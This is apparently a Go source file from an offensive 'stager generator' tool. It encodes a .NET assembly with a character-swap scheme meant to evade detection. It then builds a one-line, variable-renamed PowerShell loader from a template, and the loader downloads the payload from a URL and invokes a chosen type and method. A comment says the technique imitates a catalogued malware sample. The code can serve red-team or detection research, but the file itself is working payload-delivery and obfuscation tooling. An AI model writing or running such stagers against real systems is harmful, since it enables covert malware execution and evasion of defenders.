package psobfuscation1

import (
    "fmt"
    "os"
    "log"
    "strings"
    "path/filepath"
    
    "stager_generator/utils"
)

const (
    TEMPLATE_PATH = "./psobfuscation1"
    //TEMPLATE_PS_FILE = filepath.Join(TEMPLATE_PATH, "/loader.ps1")
    //LOADER_JS_FILE = TEMPLATE_PATH + "/loader.js"
    TEMP_OUTPUT_DIRECTORY = "./temp_outfile"
)

/*

Sample Reference:
https://bazaar.abuse.ch/sample/a755759a2efb1f49d639af3f8166cb334e7fd537c3baf454e561f7ad6d07838f/

Description:


Returns the powershell loader as string, and the file path to the obfuscated .NET file.

*/

func PsObfuscation1(dotnetFilepath string, localFilepath string, url string, getType string, getMethod string, args string) (string, string) {
    fmt.Println("[*] Starting Powershell Obfuscation 1.")

    // Base64 encode original .NET file
    tempB64Dotnet := utils.Base64EncodeFile(dotnetFilepath)

    // Replace a b64 character with invalid characters
    originalChar := "A"
    newChar := "$$"
    
    tempB64Dotnet = strings.ReplaceAll(tempB64Dotnet, originalChar, newChar)

    // Writing encode file
    sl := strings.Split(url, "/")
    encodedFilename := sl[len(sl)-1]
    if (encodedFilename == ""){
        encodedFilename = "Encoded_dotnet_file.txt"
    }
    tempDst := filepath.Join(TEMP_OUTPUT_DIRECTORY, encodedFilename)
    err := os.WriteFile(tempDst, []byte(tempB64Dotnet), 0644)
    if err != nil{
        log.Fatal(err)
    }

    // Replacing placeholders in loader.ps1
    templatePsFilePath := filepath.Join(TEMPLATE_PATH, "/loader.ps1")
    content, err := os.ReadFile(templatePsFilePath)
    if err != nil {
        log.Fatal(err)
    }

    originalTemplateScript := string(content)

    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "NEW_CHAR", newChar)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "ORIGINAL_CHAR", originalChar)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "URL_HERE", url)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "LOCAL_FILE_PATH", localFilepath)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "GET_TYPE", getType)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "GET_METHOD", getMethod)
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "LOCAL_SPLIT_FILE_PATH", SplitPathString(localFilepath))
    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "RANDOM_FILENAME", utils.RandomString(5))

    // Add arguments if there is any
    var custom_arguments string;
    if len(args) > 0 {
        custom_arguments = "[object[]] (ARGUMENTS)"
        custom_arguments = strings.ReplaceAll(custom_arguments, "ARGUMENTS", args)
    }else{
        custom_arguments = "$null"
    }

    originalTemplateScript = strings.ReplaceAll(originalTemplateScript, "ARGUMENT_LIST", custom_arguments)

    originalTemplateScriptSlice := utils.ReplacePowershellVariables(utils.StringToSlice(originalTemplateScript))

    originalTemplateScriptSlice = utils.RemovePowershellComments(originalTemplateScriptSlice) 

    originalTemplateScript = utils.SliceToStringOneLine(originalTemplateScriptSlice)


    return originalTemplateScript, tempDst

}

func SplitPathString(path string) string{
    pathSlice := utils.StringToSliceRandomLengths(path, 1, 20)

    var splitPath string
    splitPath = "''"
    for _, s := range pathSlice {
        splitPath += " + '" + s + "'"
    }

    return splitPath
}